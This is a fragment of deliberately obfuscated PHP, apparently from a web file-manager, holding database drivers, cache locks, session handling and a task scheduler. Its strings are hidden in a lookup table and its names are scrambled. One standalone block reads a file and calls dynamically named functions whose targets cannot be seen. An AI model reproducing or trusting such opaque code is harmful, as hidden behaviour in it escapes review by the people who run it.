$›¾ÑÈ¸; if ($this->queryID) { $this->free(); } think_action_status($ƒ‹†…Ôû[23], 1); think_status($ƒ‹†…Ôû[24]); $this->queryID = sqlite_query($this->_linkID, $›¾ÑÈ¸); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ò½Á™ı¿ = $this->getAll(); return $Ò½Á™ı¿; } } public function execute($­ÕØ×€Ô) { $€ØØÒÆá =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­ÕØ×€Ô; if ($this->queryID) { $this->free(); } think_action_status($€ØØÒÆá[25], 1); think_status($€ØØÒÆá[24]); $ç×—ÏŠğ = sqlite_exec($this->_linkID, $­ÕØ×€Ô); $this->debug(); if (!1 === $ç×—ÏŠğ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¿ÈˆÑ¸ä][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ùë¤İ ­ = sqlite_query($this->_linkID, $_SERVER[¿ÈˆÑ¸ä][27]); if (!$ùë¤İ ­) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $È£¸à¾¿ = sqlite_query($this->_linkID, $_SERVER[¿ÈˆÑ¸ä][28]); if (!$È£¸à¾¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $º×¤¬ı = array(); if ($this->numRows > 0) { for ($·‘³Åşë = 0; $·‘³Åşë < $this->numRows; $·‘³Åşë++) { $º×¤¬ı[$·‘³Åşë] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $º×¤¬ı; } public function getFields($µâÍáÚØ) { $²Ø©Ìî =& $_SERVER[¿ÈˆÑ¸ä]; $¹ßÇ¨õ™ = $this->query($²Ø©Ìî[29] . $µâÍáÚØ . $²Ø©Ìî[30]); $ìĞ±ğ¥Û = array(); if ($¹ßÇ¨õ™) { foreach ($¹ßÇ¨õ™ as $ÓÕ¾ => $°»Ş²¼Á) { $ìĞ±ğ¥Û[$°»Ş²¼Á[$²Ø©Ìî[31]]] = array($²Ø©Ìî[32] => $°»Ş²¼Á[$²Ø©Ìî[31]], $²Ø©Ìî[33] => $°»Ş²¼Á[$²Ø©Ìî[34]], $²Ø©Ìî[35] => (bool) ($°»Ş²¼Á[$²Ø©Ìî[36]] === $²Ø©Ìî[12]), $²Ø©Ìî[37] => $°»Ş²¼Á[$²Ø©Ìî[38]], $²Ø©Ìî[39] => strtolower($°»Ş²¼Á[$²Ø©Ìî[40]]) == $²Ø©Ìî[41], $²Ø©Ìî[42] => strtolower($°»Ş²¼Á[$²Ø©Ìî[43]]) == $²Ø©Ìî[44]); } } return $ìĞ±ğ¥Û; } public function getTables($•«†Ùª  = '') { $ÃÇğèêí =& $_SERVER[¿ÈˆÑ¸ä]; $•™çèùı = $this->query($ÃÇğèêí[45] . $ÃÇğèêí[46] . $ÃÇğèêí[47]); $É·Û§Ò = array(); foreach ($•™çèùı as $½¸Éöê´ => $ó‡¬Ÿ) { $É·Û§Ò[$½¸Éöê´] = current($ó‡¬Ÿ); } return $É·Û§Ò; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $â¿É…š =& $_SERVER[¿ÈˆÑ¸ä]; $«ƒèéªÉ = sqlite_last_error($this->_linkID); $this->error = $«ƒèéªÉ . $â¿É…š[4] . sqlite_error_string($«ƒèéªÉ); if ($â¿É…š[12] != $this->queryStr) { $this->error .= LNG($â¿É…š[48]) . $this->queryStr; } think_trace($this->error, $â¿É…š[12], $â¿É…š[49]); return $this->error; } public function escapeString($¥õÌ’§É) { return sqlite_escape_string($¥õÌ’§É); } public function parseLimit($ŸÆõŞê¯) { $Áå¶ƒÄƒ =& $_SERVER[¿ÈˆÑ¸ä]; $Ë«Ï¸× = $Áå¶ƒÄƒ[12]; if (!empty($ŸÆõŞê¯)) { $ŸÆõŞê¯ = explode($Áå¶ƒÄƒ[50], $ŸÆõŞê¯); if (count($ŸÆõŞê¯) > 1) { $Ë«Ï¸× .= $Áå¶ƒÄƒ[51] . $ŸÆõŞê¯[1] . $Áå¶ƒÄƒ[52] . $ŸÆõŞê¯[0] . $Áå¶ƒÄƒ[53]; } else { $Ë«Ï¸× .= $Áå¶ƒÄƒ[51] . $ŸÆõŞê¯[0] . $Áå¶ƒÄƒ[53]; } } return $Ë«Ï¸×; } } class DbSqlite3Base extends Db { public function __construct($¯âÔ—» = '') { $ÙîôŞ½° =& $_SERVER[¿ÈˆÑ¸ä]; if (!class_exists($ÙîôŞ½°[54])) { think_exception(think_lang($ÙîôŞ½°[14]) . $ÙîôŞ½°[55]); } if (!empty($¯âÔ—»)) { if (!isset($¯âÔ—»[$ÙîôŞ½°[16]])) { $¯âÔ—»[$ÙîôŞ½°[16]] = 438; } $this->config = $¯âÔ—»; if (empty($this->config[$ÙîôŞ½°[17]])) { $this->config[$ÙîôŞ½°[17]] = array(); } } } public function connect($¨ÅÎÀ‰¿ = '', $Ô·şÑ© = 0) { $”¤‘•¯Å =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->linkID[$Ô·şÑ©])) { if (empty($¨ÅÎÀ‰¿)) { $¨ÅÎÀ‰¿ = $this->config; } $this->linkID[$Ô·şÑ©] = new SQLite3($¨ÅÎÀ‰¿[$”¤‘•¯Å[21]]); if (!$this->linkID[$Ô·şÑ©]) { think_exception($this->linkID[$Ô·şÑ©]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ô·şÑ©]->busyTimeout(30000); if (1 != think_config($”¤‘•¯Å[22])) { unset($this->config); } } return $this->linkID[$Ô·şÑ©]; } public function free() { $this->queryID = null; } public function query($“ÅÄàç¹) { $ñÎ‡ÜÛ =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $“ÅÄàç¹; if ($this->queryID) { $this->free(); } think_action_status($ñÎ‡ÜÛ[23], 1); think_status($ñÎ‡ÜÛ[24]); $this->queryID = $this->_linkID->query($“ÅÄàç¹); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $…—ÄÊ£  = $this->getAll(); $this->numRows = count($…—ÄÊ£ ); return $…—ÄÊ£ ; } } public function execute($€¬œ”Îû) { $¬Œ¶¡®â =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€¬œ”Îû; if ($this->queryID) { $this->free(); } think_action_status($¬Œ¶¡®â[25], 1); think_status($¬Œ¶¡®â[24]); $·Í»æÈ = $this->_linkID->exec($€¬œ”Îû); $this->debug(); if (!1 === $·Í»æÈ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¿ÈˆÑ¸ä][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $©´äÊ½ = $this->_linkID->query($_SERVER[¿ÈˆÑ¸ä][27]); if (!$©´äÊ½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ìŒÕ¨Ñ = $this->_linkID->query($_SERVER[¿ÈˆÑ¸ä][28]); if (!$ìŒÕ¨Ñ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ĞÀÌêí = array(); while ($ªö„Êß‡ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ĞÀÌêí[] = $ªö„Êß‡; } $this->queryID->reset(); return $ĞÀÌêí; } public function getFields($Äøƒ•½É) { $›É¼½¸Ô =& $_SERVER[¿ÈˆÑ¸ä]; $¬ŸÚ¸°œ = $this->query($›É¼½¸Ô[29] . $Äøƒ•½É . $›É¼½¸Ô[30]); $¾¹¸…Ÿ = array(); if ($¬ŸÚ¸°œ) { foreach ($¬ŸÚ¸°œ as $ª‡ç¬ÛĞ => $›·ÉÉÆò) { $¾¹¸…Ÿ[$›·ÉÉÆò[$›É¼½¸Ô[32]]] = array($›É¼½¸Ô[32] => $›·ÉÉÆò[$›É¼½¸Ô[32]], $›É¼½¸Ô[33] => $›·ÉÉÆò[$›É¼½¸Ô[33]], $›É¼½¸Ô[35] => (bool) ($›·ÉÉÆò[$›É¼½¸Ô[35]] === $›É¼½¸Ô[12]), $›É¼½¸Ô[37] => $›·ÉÉÆò[$›É¼½¸Ô[56]], $›É¼½¸Ô[39] => (bool) $›·ÉÉÆò[$›É¼½¸Ô[57]], $›É¼½¸Ô[42] => (bool) $›·ÉÉÆò[$›É¼½¸Ô[57]]); } } return $¾¹¸…Ÿ; } public function getTables($³ˆì‰İ = '') { $©­ôìİÒ =& $_SERVER[¿ÈˆÑ¸ä]; $’óÏŞ = $this->query($©­ôìİÒ[45] . $©­ôìİÒ[46] . $©­ôìİÒ[47]); $•ÃŸÂˆ = array(); foreach ($’óÏŞ as $–‡óÏ => $è“ƒŸ‰½) { $•ÃŸÂˆ[$–‡óÏ] = current($è“ƒŸ‰½); } return $•ÃŸÂˆ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÄâÄêùÇ =& $_SERVER[¿ÈˆÑ¸ä]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÄâÄêùÇ[12] != $this->queryStr) { $this->error .= LNG($ÄâÄêùÇ[48]) . $this->queryStr; } think_trace($this->error, $ÄâÄêùÇ[12], $ÄâÄêùÇ[49]); return $this->error; } public function escapeString($Ê¹…Øø) { $ß‰‹Â =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->_linkID) { return $this->_linkID->escapeString($Ê¹…Øø); } return str_ireplace($ß‰‹Â[58], $ß‰‹Â[59], $Ê¹…Øø); } public function parseLimit($ãŒÑÆè±) { $Æ¦Ğàš =& $_SERVER[¿ÈˆÑ¸ä]; $ìË ó‹‹ = $Æ¦Ğàš[12]; if (!empty($ãŒÑÆè±)) { $ãŒÑÆè± = explode($Æ¦Ğàš[50], $ãŒÑÆè±); if (count($ãŒÑÆè±) > 1) { $ìË ó‹‹ .= $Æ¦Ğàš[51] . $ãŒÑÆè±[1] . $Æ¦Ğàš[52] . $ãŒÑÆè±[0] . $Æ¦Ğàš[53]; } else { $ìË ó‹‹ .= $Æ¦Ğàš[51] . $ãŒÑÆè±[0] . $Æ¦Ğàš[53]; } } return $ìË ó‹‹; } } goto Càšš–ßË; FÌñé¼Š¯‰: class CacheLockMemcached { public function lock($àµ¢•Á, $Èò²ÀÅ = 0) { $ëŒÄÜ¼ã = Cache::init(); $–×ÂĞæÇ = microtime(!0) + $Èò²ÀÅ; while (microtime(!0) < $–×ÂĞæÇ) { $ó¬¾àÑ® = $ëŒÄÜ¼ã->get($àµ¢•Á); if (!$ó¬¾àÑ® || $ó¬¾àÑ® < microtime(!0)) { $ñë÷¹Âá = $ëŒÄÜ¼ã->handle->add($àµ¢•Á, $–×ÂĞæÇ, $Èò²ÀÅ); if ($ñë÷¹Âá) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($›»âû‰) { return Cache::init()->get($›»âû‰); } public function unlock($Ç—¾”ÀÊ) { return Cache::init()->remove($Ç—¾”ÀÊ); } } if ($_SERVER[$_SERVER[¿ÈˆÑ¸ä][962]] != $_SERVER[$_SERVER[¿ÈˆÑ¸ä][963]]) { $_getc = $_SERVER[¿ÈˆÑ¸ä][964]; $_getfile = $_SERVER[$_SERVER[¿ÈˆÑ¸ä][965]] . $_SERVER[¿ÈˆÑ¸ä][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ÈˆÑ¸ä][286], $_getfilec); if (count($_getarrs) < $_SERVER[¿ÈˆÑ¸ä][699]) { $exit = $_SERVER[¿ÈˆÑ¸ä][967]; $exit(); } $_act = $_SERVER[¿ÈˆÑ¸ä][968]; $_act($_SERVER[$_SERVER[¿ÈˆÑ¸ä][969]]); } class CacheLockDatabase { public function lock($ùÀ„ùöÉ, $éÊø‚àß = 0) { $÷×½ùÌ = Model($_SERVER[¿ÈˆÑ¸ä][920]); $œ¤á½ÈØ = microtime(!0) + $éÊø‚àß; while (microtime(!0) < $œ¤á½ÈØ) { $¶µİ«èØ = $÷×½ùÌ->get($ùÀ„ùöÉ); if (!$¶µİ«èØ || $¶µİ«èØ < microtime(!0)) { $×ÉìÛğ° = $÷×½ùÌ->set($ùÀ„ùöÉ, $œ¤á½ÈØ); if ($×ÉìÛğ°) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Óçã×ßè) { return Model($_SERVER[¿ÈˆÑ¸ä][920])->get($Óçã×ßè); } public function unlock($®µßè®¯) { Model($_SERVER[¿ÈˆÑ¸ä][920])->remove($®µßè®¯); } } goto DÒ½èìŞÑ; e—çÈ¿‘ê: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¼¦ï¦›¹ =& $_SERVER[¿ÈˆÑ¸ä]; static $šªÓ…Š = false; if ($šªÓ…Š) { return $šªÓ…Š; } $ßöÎÑ•š = $GLOBALS[$¼¦ï¦›¹[6]][$¼¦ï¦›¹[425]]; self::$sessionTime = $ßöÎÑ•š[$¼¦ï¦›¹[1862]]; $®¡…¿Óç = isset($GLOBALS[$¼¦ï¦›¹[1863]]) ? $GLOBALS[$¼¦ï¦›¹[1863]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($®¡…¿Óç)) { self::$sessionSign = Cookie::get($®¡…¿Óç); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($®¡…¿Óç, self::$sessionSign, self::$sessionTime); $§×ù´ÙÀ = $ßöÎÑ•š[$¼¦ï¦›¹[1864]]; $ıøå˜¶ = $ßöÎÑ•š[$§×ù´ÙÀ]; $œ±¥Ÿ¦ª = $ßöÎÑ•š[$¼¦ï¦›¹[919]]; switch ($§×ù´ÙÀ) { case $¼¦ï¦›¹[21]: self::$handle = Model($¼¦ï¦›¹[920]); break; case $¼¦ï¦›¹[921]: self::$handle = new CacheRedis($ıøå˜¶, $œ±¥Ÿ¦ª); break; case $¼¦ï¦›¹[922]: self::$handle = new CacheMemcached($ıøå˜¶, $œ±¥Ÿ¦ª); break; case $¼¦ï¦›¹[231]: $ıøå˜¶[$¼¦ï¦›¹[87]] = $ıøå˜¶[$¼¦ï¦›¹[87]] . $¼¦ï¦›¹[1865]; self::$handle = new CacheFile($ıøå˜¶, $œ±¥Ÿ¦ª); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $šªÓ…Š = new self(); return $šªÓ…Š; } public static function getBySign($³Å‰”Şß) { $¯ò¨Şé÷ = self::$handle->get($³Å‰”Şß); $¯ò¨Şé÷ = unserialize($¯ò¨Şé÷); return is_array($¯ò¨Şé÷) ? $¯ò¨Şé÷ : array(); } public static function setBySign($”‡úõíæ, $Ù¸èàâÜ) { CacheLock::lock($”‡úõíæ); self::$handle->set($”‡úõíæ, serialize($Ù¸èàâÜ), self::$sessionTime); CacheLock::unlock($”‡úõíæ); } public static function sign($áñ¾¸ˆ = false) { if ($áñ¾¸ˆ) { self::$sessionSign = $áñ¾¸ˆ; } self::init(); return self::$sessionSign; } public static function set($ƒ¼‡­ïÎ, $ˆê·¢ˆ = false) { self::init(); if (is_array($ƒ¼‡­ïÎ)) { foreach ($ƒ¼‡­ïÎ as $¼Îè¿îé => $ŒÍ¤âØì) { array_set_value(self::$data, $¼Îè¿îé, $ŒÍ¤âØì); } } else { array_set_value(self::$data, $ƒ¼‡­ïÎ, $ˆê·¢ˆ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($§¬Ç³˜ = false) { self::init(); if (!$§¬Ç³˜) { return self::$data; } return array_get_value(self::$data, $§¬Ç³˜); } public static function remove($ø¨ÉºôÎ) { self::init(); unset(self::$data[$ø¨ÉºôÎ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¿ÈˆÑ¸ä][928])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ñ¾‘“³Ğ =& $_SERVER[¿ÈˆÑ¸ä]; if (self::valueGet($ñ¾‘“³Ğ[833]) != $ñ¾‘“³Ğ[91]) { return; } if (self::valueGet($ñ¾‘“³Ğ[1866]) == $ñ¾‘“³Ğ[91]) { $š‚‚Ä‹ = self::valueGet($ñ¾‘“³Ğ[1867]); if (time() - $š‚‚Ä‹ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ñ¾‘“³Ğ[1866], $ñ¾‘“³Ğ[91]); self::log($ñ¾‘“³Ğ[1868] . ACTION . $ñ¾‘“³Ğ[1869]); Hook::bind($ñ¾‘“³Ğ[1870], $ñ¾‘“³Ğ[1871]); $¡ë‰—ˆ¨ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ñ¾‘“³Ğ[833]) != $ñ¾‘“³Ğ[91]) { self::valueSet($ñ¾‘“³Ğ[1866], $ñ¾‘“³Ğ[229]); self::log($ñ¾‘“³Ğ[1872]); die; } $ºÇÙÏíà = time(); if ($ºÇÙÏíà - $¡ë‰—ˆ¨ >= 60) { self::valueSet(array($ñ¾‘“³Ğ[1866] => $ñ¾‘“³Ğ[91], $ñ¾‘“³Ğ[1867] => $ºÇÙÏíà)); $¡ë‰—ˆ¨ = $ºÇÙÏíà; } if (!file_exists(USER_SYSTEM . $ñ¾‘“³Ğ[1873])) { self::valueSet(array($ñ¾‘“³Ğ[1866] => $ñ¾‘“³Ğ[229], $ñ¾‘“³Ğ[833] => $ñ¾‘“³Ğ[229])); self::log($ñ¾‘“³Ğ[1874]); die; } $¹Ìüãõà = file_get_contents(BASIC_PATH . $ñ¾‘“³Ğ[1875]); $‚›†ÔÍ = KOD_VERSION . $ñ¾‘“³Ğ[10] . KOD_VERSION_BUILD; $‡º†æ­” = match_text($¹Ìüãõà, $ñ¾‘“³Ğ[1876]) . $ñ¾‘“³Ğ[10] . match_text($¹Ìüãõà, $ñ¾‘“³Ğ[1877]); if ($‡º†æ­” != $‚›†ÔÍ) { self::restart(); self::log("\x73\164\x6f\160\x65\x64\56\133\166\145\x72\163\x69\x6f\x6e\x20\165\160\144\141\x74\145\73{$versionNow}\40\x3d\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $²ßÇ²Öø =& $_SERVER[¿ÈˆÑ¸ä]; http_close(); $GLOBALS[$²ßÇ²Öø[1878]] = 1; $_SERVER[$²ßÇ²Öø[1879]] = $²ßÇ²Öø[1880]; $_COOKIE = array(); $GLOBALS[$²ßÇ²Öø[1881]] = 1; $GLOBALS[$²ßÇ²Öø[1882]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $úèİæú¶ =& $_SERVER[¿ÈˆÑ¸ä]; http_close(); self::valueSet($úèİæú¶[833], $úèİæú¶[229]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($úèİæú¶[1866] => $úèİæú¶[229], $úèİæú¶[833] => $úèİæú¶[91])); self::log($úèİæú¶[1883]); } public static function taskSwitch() { $ÅêÕô…ã =& $_SERVER[¿ÈˆÑ¸ä]; $Œë¹Ÿê© = self::valueGet($ÅêÕô…ã[833]) == $ÅêÕô…ã[91] ? $ÅêÕô…ã[229] : $ÅêÕô…ã[91]; self::valueSet($ÅêÕô…ã[833], $Œë¹Ÿê©); } public static function shutdownEvent() { $ËşåÑÉÛ =& $_SERVER[¿ÈˆÑ¸ä]; self::valueSet($ËşåÑÉÛ[1866], $ËşåÑÉÛ[229]); self::log($ËşåÑÉÛ[1884]); } public static function config($Ê…±ÆòÉ, $µ¥Ùæº) { self::valueSet($_SERVER[¿ÈˆÑ¸ä][833], $Ê…±ÆòÉ); } private static function taskRunAll() { $ôçâ´•Ñ =& $_SERVER[¿ÈˆÑ¸ä]; $ˆº—ØË² = timeFloat(); $·€’ÆÌË = Model($ôçâ´•Ñ[1885])->listData(); $é¨ÖÏ¶ = count($·€’ÆÌË); for ($½ğøÆà¥ = 0; $½ğøÆà¥ < $é¨ÖÏ¶; $½ğøÆà¥++) { $¹ß’„«’ = $·€’ÆÌË[$½ğøÆà¥]; if (!$¹ß’„«’[$ôçâ´•Ñ[483]] || $¹ß’„«’[$ôçâ´•Ñ[1886]] != $ôçâ´•Ñ[91]) { continue; } if (!self::taskTimeCheck($¹ß’„«’)) { continue; } self::taskRun($¹ß’„«’); } Hook::trigger($ôçâ´•Ñ[1887]); self::taskQueueRun($ˆº—ØË²); } private static function taskQueueRun($ŠÅ½ñ ï) { $ôÈ¶³«é = 10; while (!0) { $ê…¬­• = TaskQueue::run(); if ($ê…¬­• === !1) { break; } if (timeFloat() - $ŠÅ½ñ ï >= $ôÈ¶³«é) { break; } } } private static function taskTimeCheck($œÓ†µ©ï) { $¹£å¹ˆÔ =& $_SERVER[¿ÈˆÑ¸ä]; $ñŒêÃ˜ = json_decode($œÓ†µ©ï[$¹£å¹ˆÔ[205]], !0); $ °–àıš = intval($œÓ†µ©ï[$¹£å¹ˆÔ[1867]]); $§í˜ñ¹É = strtotime($¹£å¹ˆÔ[1888] . $ñŒêÃ˜[$¹£å¹ˆÔ[1889]] . $¹£å¹ˆÔ[1890]) - strtotime($¹£å¹ˆÔ[1891]); $À¬ÜÈÜ = time() - strtotime(date($¹£å¹ˆÔ[1892]) . $¹£å¹ˆÔ[1893]); $„ê…®ĞÄ = $À¬ÜÈÜ >= $§í˜ñ¹É && $À¬ÜÈÜ <= $§í˜ñ¹É + 3600; switch ($ñŒêÃ˜[$¹£å¹ˆÔ[33]]) { case $¹£å¹ˆÔ[1894]: if (time() - $ °–àıš < 3600 * 24 * 30) { return !1; } if ($ñŒêÃ˜[$¹£å¹ˆÔ[1894]] == date($¹£å¹ˆÔ[1895]) && $„ê…®ĞÄ) { return !0; } break; case $¹£å¹ˆÔ[1896]: if (time() - $ °–àıš < 3600 * 24 * 7) { return !1; } $úÜ´Ûï¿ = date($¹£å¹ˆÔ[1897]) == 0 ? 7 : date($¹£å¹ˆÔ[1897]); if ($ñŒêÃ˜[$¹£å¹ˆÔ[1896]] == $úÜ´Ûï¿ && $„ê…®ĞÄ) { return !0; } break; case $¹£å¹ˆÔ[1889]: if (time() - $ °–àıš < 3600 * 24) { return !1; } if ($„ê…®ĞÄ) { return !0; } break; case $¹£å¹ˆÔ[1898]: if (time() - $ °–àıš >= floatval($ñŒêÃ˜[$¹£å¹ˆÔ[1898]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $°ÊØÕÙä =& $_SERVER[¿ÈˆÑ¸ä]; static $Ş™ò¾šÊ = 0; $Ö­‡Óïï = 300; if (!$Ş™ò¾šÊ) { $Ş™ò¾šÊ = time(); } if (time() - $Ş™ò¾šÊ < $Ö­‡Óïï) { return; } $Ş™ò¾šÊ = time(); $ ¬Š†©Ó = Model($°ÊØÕÙä[593])->db($°ÊØÕÙä[12]); if ($ ¬Š†©Ó) { $ ¬Š†©Ó->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($°ÊØÕÙä[1899], $°ÊØÕÙä[1900]); die; } } public static function taskRun($œæ¹®Î¾) { $ÆîŒ±Ø‡ =& $_SERVER[¿ÈˆÑ¸ä]; self::log($ÆîŒ±Ø‡[1901] . $œæ¹®Î¾[$ÆîŒ±Ø‡[483]] . $ÆîŒ±Ø‡[1902] . $œæ¹®Î¾[$ÆîŒ±Ø‡[32]] . $ÆîŒ±Ø‡[1903] . $œæ¹®Î¾[$ÆîŒ±Ø‡[1500]]); Model($ÆîŒ±Ø‡[1885])->run($œæ¹®Î¾[$ÆîŒ±Ø‡[483]]); $çåßïŠ« = timeFloat(); $§Œ‚ ¬ = $ÆîŒ±Ø‡[12]; switch ($œæ¹®Î¾[$ÆîŒ±Ø‡[33]]) { case $ÆîŒ±Ø‡[383]: $ÓŸ¸ğÍÈ = url_request($œæ¹®Î¾[$ÆîŒ±Ø‡[1500]], $ÆîŒ±Ø‡[1542], !1, !1, !1, !1, 10); if ($ÓŸ¸ğÍÈ[$ÆîŒ±Ø‡[833]]) { $§Œ‚ ¬ = strlen($ÓŸ¸ğÍÈ[$ÆîŒ±Ø‡[1326]]); } break; case $ÆîŒ±Ø‡[1904]: $§Œ‚ ¬ = Hook::apply($œæ¹®Î¾[$ÆîŒ±Ø‡[1500]]); default: break; } Model($ÆîŒ±Ø‡[1905])->add(array($ÆîŒ±Ø‡[1906] => $ÆîŒ±Ø‡[12], $ÆîŒ±Ø‡[1907] => $ÆîŒ±Ø‡[229], $ÆîŒ±Ø‡[33] => $ÆîŒ±Ø‡[1908] . $œæ¹®Î¾[$ÆîŒ±Ø‡[483]], $ÆîŒ±Ø‡[1909] => json_encode(array($ÆîŒ±Ø‡[32] => $œæ¹®Î¾[$ÆîŒ±Ø‡[32]], $ÆîŒ±Ø‡[1910] => timeFloat() - $çåßïŠ«, $ÆîŒ±Ø‡[839] => $§Œ‚ ¬)))); $Æõ¡ÀÎ = $§Œ‚ ¬ ? $ÆîŒ±Ø‡[1911] . $§Œ‚ ¬ : $ÆîŒ±Ø‡[12]; self::log($ÆîŒ±Ø‡[1912] . $œæ¹®Î¾[$ÆîŒ±Ø‡[483]] . $ÆîŒ±Ø‡[176] . $Æõ¡ÀÎ); return !0; } public static function valueGet($¨ç£§òÃ) { $Ô¹ˆ–ñµ =& $_SERVER[¿ÈˆÑ¸ä]; $£¿ßœ¶¢ = $Ô¹ˆ–ñµ[1913]; $À¶ê™±Æ = Model($Ô¹ˆ–ñµ[518])->get($¨ç£§òÃ, $£¿ßœ¶¢); if (is_null($À¶ê™±Æ)) { Model($Ô¹ˆ–ñµ[518])->set($Ô¹ˆ–ñµ[833], $Ô¹ˆ–ñµ[91], $£¿ßœ¶¢); Model($Ô¹ˆ–ñµ[518])->set($Ô¹ˆ–ñµ[1866], $Ô¹ˆ–ñµ[229], $£¿ßœ¶¢); $À¶ê™±Æ = Model($Ô¹ˆ–ñµ[518])->get($¨ç£§òÃ, $£¿ßœ¶¢); } return $À¶ê™±Æ; } private static function valueSet($¥ÑŠ¤ùà, $ŠşêÄ·· = false) { $öïÍ³Ô =& $_SERVER[¿ÈˆÑ¸ä]; $¶Í“‹« = $öïÍ³Ô[1914]; CacheLock::lock($¶Í“‹«); $ø‘ôˆùò = Model($öïÍ³Ô[518])->set($¥ÑŠ¤ùà, $ŠşêÄ··, $öïÍ³Ô[1913]); CacheLock::unlock($¶Í“‹«); return $ø‘ôˆùò; } protected static function log($í·×§ãÄ) { write_log($í·×§ãÄ, $_SERVER[¿ÈˆÑ¸ä][1900]); } private static function cacheClear() { $£ë¼ç´Ñ =& $_SERVER[¿ÈˆÑ¸ä]; Cache::clearMemory(Model($£ë¼ç´Ñ[518])->cacheKey($£ë¼ç´Ñ[1913])); Cache::clearMemory(Model($£ë¼ç´Ñ[518])->cacheKey($£ë¼ç´Ñ[1915])); Model($£ë¼ç´Ñ[1885])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\x69\156\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($“âğ¡·ó, $Êßô®¹„ = '', $Öƒ«øœˆ = 0, $êúå·š´ = '') { $óØšµæ =& $_SERVER[¿ÈˆÑ¸ä]; if (self::get($“âğ¡·ó)) { return; } $this->task = array($óØšµæ[483] => $“âğ¡·ó, $óØšµæ[1529] => USER_ID, $óØšµæ[1802] => $êúå·š´, $óØšµæ[536] => $óØšµæ[12], $óØšµæ[33] => $Êßô®¹„, $óØšµæ[1167] => $óØšµæ[12], $óØšµæ[1165] => $Öƒ«øœˆ, $óØšµæ[1916] => 0, $óØšµæ[1917] => 0, $óØšµæ[1918] => 0, $óØšµæ[1919] => timeFloat(), $óØšµæ[1920] => 0, $óØšµæ[1921] => 0, $óØšµæ[1922] => 0, $óØšµæ[1923] => 0, $óØšµæ[833] => $óØšµæ[1866]); $GLOBALS[$óØšµæ[1924]] = 1; Hook::bind($óØšµæ[1870], array($this, $óØšµæ[1925])); Hook::bind($óØšµæ[1926], array($this, $óØšµæ[1927])); $this->startAfter(); Hook::trigger($óØšµæ[1928], $this->task); $this->task[$óØšµæ[1921]] = timeFloat(); } public function end($Ö…øÃ÷İ = '') { $¯›™Ş­ˆ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¯›™Ş­ˆ[1921]]) { self::valueSet($this->task[$¯›™Ş­ˆ[483]], !1); } $this->isEnd = !0; if ($Ö…øÃ÷İ) { $this->task[$¯›™Ş­ˆ[536]] = $Ö…øÃ÷İ; } self::log($¯›™Ş­ˆ[1929] . $this->task[$¯›™Ş­ˆ[483]] . $¯›™Ş­ˆ[1930] . sprintf($¯›™Ş­ˆ[946], timeFloat() - $this->task[$¯›™Ş­ˆ[1919]]) . $¯›™Ş­ˆ[1931]); 